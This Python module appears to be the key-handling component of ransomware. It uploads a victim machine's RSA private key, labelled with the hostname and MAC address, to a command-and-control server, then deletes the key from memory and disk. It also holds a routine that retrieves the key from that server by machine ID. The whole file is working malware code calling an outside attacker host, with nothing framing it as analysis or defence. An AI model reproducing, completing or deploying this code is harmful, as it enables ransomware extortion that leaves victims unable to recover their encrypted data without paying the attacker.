import requests
import os
import gc
import socket
import uuid
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from Variables import c2_server, rsa_key

####################################################################################################################

def send_private_key_to_c2(private_key):
    # Serialize private key so it can be sent as bytes
    private_key_bytes = private_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption()
    )

    # Rename of the private key
    unique_id = get_machine_identifier()
    renamed_key = f"{unique_id}_private.pem"

    try:
        # Sending the private key to c2 server
        files = {"key": (renamed_key, private_key_bytes)}
        response = requests.post(c2_server + "/upload_key", files=files)
        
        if response.status_code == 200:
            print(f"Sent private key: {renamed_key}") # Debug Message

            # Delete private key from memory and system
            private_key = None
            gc.collect()
            if os.path.exists(rsa_key):
                os.remove(rsa_key)
                print(f"Deleted private key file: {rsa_key}") # Debug Message

        else:
            print(f"Error send key status code: {response.status_code}") # Debug Message

    except Exception as e:
        print(f"Error sending key: {e}") # Debug Message

####################################################################################################################

def get_machine_identifier():
    hostname = socket.gethostname()
    mac = uuid.getnode()
    unique_id = f"{hostname}_{mac}"
    return unique_id

####################################################################################################################

def fetch_and_load_private_key():
    unique_id = get_machine_identifier()
    renamed_key = f"{unique_id}_private.pem"
    url = f"{c2_server}/get_key/{renamed_key}"
    try:
        resp = requests.get(url)
        resp.raise_for_status()
        print("Success fetching key") # Debug Message
    except requests.RequestException as e:
        print(f"Error fetch key: {e}") # Debug Message
        return None

    pem_bytes = resp.content

    try:
        private_key = serialization.load_pem_private_key(
            pem_bytes,
            password=None,
            backend=default_backend()
        )
        return private_key
    except Exception as e:
        print(f"Invalid key: {e}") # Debug Message
        return None
    
####################################################################################################################